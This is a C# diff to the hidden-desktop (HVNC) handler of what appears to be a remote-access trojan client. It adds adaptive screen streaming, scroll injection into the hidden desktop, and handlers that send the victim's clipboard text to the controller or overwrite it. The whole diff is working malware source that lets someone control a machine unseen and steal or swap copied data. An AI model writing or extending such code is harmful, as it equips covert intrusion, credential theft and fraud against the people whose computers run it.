@@ -1,10 +1,13 @@
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
 using RemoteControl.Client.Utils;
 using RemoteControl.Protocals;
+using RemoteControl.Protocals.Request;
+using RemoteControl.Protocals.Response;
 
 namespace RemoteControl.Client.Handlers
 {
@@ -17,6 +20,11 @@ namespace RemoteControl.Client.Handlers
         private volatile bool _isRunning = false;
         private Thread _captureThread;
         private int _fps = 5;
+        private int _adaptiveFps = 5;
+        private int _jpegQuality = 70;
+        private const int MinFps = 1;
+        private const int MinJpegQuality = 35;
+        private const int MaxJpegQuality = 75;
 
         public void Handle(SocketSession session, ePacketType reqType, object reqObj)
         {
@@ -36,6 +44,12 @@ namespace RemoteControl.Client.Handlers
                     break;
                 case ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST:
                     HandleRunProcess(reqObj);
+                    break;
+                case ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST:
+                    HandleClipboardGet(session);
+                    break;
+                case ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST:
+                    HandleClipboardSet(reqObj);
                     break;
             }
         }
@@ -72,8 +86,10 @@ namespace RemoteControl.Client.Handlers
                 _isRunning = true;
                 resp.Result = true;
                 resp.DesktopName = deskName;
-                resp.ScreenWidth = 1920;
-                resp.ScreenHeight = 1080;
+                int screenW, screenH;
+                _desktop.GetScreenResolution(out screenW, out screenH);
+                resp.ScreenWidth = screenW;
+                resp.ScreenHeight = screenH;
                 session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);
 
                 // 启动截图循环
@@ -117,6 +133,13 @@ namespace RemoteControl.Client.Handlers
 
                 int button = 1; // left
                 if (req.MouseButton == eMouseButtons.Right) button = 2;
+
+                if (req.MouseOperation == eMouseOperations.MouseScroll)
+                {
+                    _desktop.InjectScrollEvent(req.MouseLocation.X, req.MouseLocation.Y, req.ScrollDelta);
+                    return;
+                }
+
                 int ope = 2; // move
                 switch (req.MouseOperation)
                 {
@@ -157,30 +180,84 @@ namespace RemoteControl.Client.Handlers
 
         private void CaptureLoop(SocketSession session)
         {
-            int interval = 1000 / _fps;
             while (_isRunning)
             {
+                Stopwatch frameWatch = Stopwatch.StartNew();
+                int requestedFps = Math.Max(MinFps, _fps);
+                if (_adaptiveFps < MinFps || _adaptiveFps > requestedFps)
+                    _adaptiveFps = requestedFps;
+                int interval = 1000 / _adaptiveFps;
+
                 try
                 {
                     using (Bitmap bmp = _desktop.CaptureScreen())
                     {
                         if (bmp != null)
                         {
-                            using (var ms = new MemoryStream())
-                            {
-                                bmp.Save(ms, ImageFormat.Jpeg);
-                                var resp = new ResponseHVNCScreen();
-                                resp.ImageData = ms.ToArray();
-                                resp.Width = bmp.Width;
-                                resp.Height = bmp.Height;
-                                session.Send(ePacketType.PACKET_HVNC_SCREEN_RESPONSE, resp);
-                            }
+                            var resp = new ResponseHVNCScreen();
+                            resp.SetImageJpegQuality(bmp, _jpegQuality);
+                            resp.Width = bmp.Width;
+                            resp.Height = bmp.Height;
+                            Stopwatch sendWatch = Stopwatch.StartNew();
+                            session.Send(ePacketType.PACKET_HVNC_SCREEN_RESPONSE, resp);
+                            sendWatch.Stop();
+                            AdjustRealtimeBudget(sendWatch.ElapsedMilliseconds, requestedFps);
                         }
                     }
                 }
                 catch { }
-                Thread.Sleep(interval);
+
+                int remain = interval - (int)frameWatch.ElapsedMilliseconds;
+                if (remain > 0)
+                    Thread.Sleep(remain);
+                else
+                    Thread.Sleep(1);
             }
+        }
+
+        private void AdjustRealtimeBudget(long sendMilliseconds, int requestedFps)
+        {
+            int frameBudget = 1000 / Math.Max(MinFps, _adaptiveFps);
+            if (sendMilliseconds > 250 || sendMilliseconds > frameBudget)
+            {
+                if (_adaptiveFps > MinFps)
+                    _adaptiveFps--;
+                if (_jpegQuality > MinJpegQuality)
+                    _jpegQuality -= 5;
+            }
+            else if (sendMilliseconds < 50)
+            {
+                if (_adaptiveFps < requestedFps)
+                    _adaptiveFps++;
+                if (_jpegQuality < MaxJpegQuality)
+                    _jpegQuality += 2;
+            }
+        }
+
+        private void HandleClipboardGet(SocketSession session)
+        {
+            if (_desktop == null) return;
+            try
+            {
+                string text = _desktop.GetClipboardText() ?? "";
+                var resp = new ResponseClipboardGet();
+                resp.Result = true;
+                resp.Text = text;
+                session.Send(ePacketType.PACKET_HVNC_CLIPBOARD_GET_RESPONSE, resp);
+            }
+            catch { }
+        }
+
+        private void HandleClipboardSet(object reqObj)
+        {
+            if (_desktop == null) return;
+            try
+            {
+                var req = reqObj as RequestClipboardSet;
+                if (req == null) return;
+                _desktop.SetClipboardText(req.Text ?? "");
+            }
+            catch { }
         }
     }
 }
